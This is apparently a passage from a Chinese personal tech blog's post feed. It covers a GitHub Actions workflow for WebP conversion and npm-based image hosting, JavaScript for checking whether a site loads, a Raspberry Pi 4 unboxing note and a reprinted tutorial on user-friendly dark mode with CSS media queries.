title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 